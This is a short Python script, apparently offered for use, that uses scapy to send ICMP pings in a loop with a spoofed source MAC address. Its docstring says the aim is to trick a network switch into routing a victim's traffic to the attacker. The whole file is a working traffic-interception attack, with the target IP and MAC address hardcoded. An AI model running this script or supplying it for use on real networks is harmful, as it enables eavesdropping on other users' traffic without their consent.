'''
	This script works by constantly PINGing an IP address with a fake MAC address
	thereby spoofing the switch into thinking that you are the rightful owner of this MAC address.
	Therefore, (in theory) all the traffic coming from or to the MAC address will be sent to you.
'''
from scapy.all import *
import time

ip = "10.1.40.7"
mac = "74:27:ea:e3:f0:9d"
iface = "以太网"


def macspoof(ip, mac):
    # create an ICMP echo request packet
    p = Ether(src=mac) / IP(dst=ip) / ICMP()
    print("PING {} with MAC {}".format(ip, mac))
    while True:
        try:
            sendp(p, verbose=0,
                  iface=iface)
            time.sleep(0.1)

        except KeyboardInterrupt:
            exit(0)


macspoof(ip, mac)
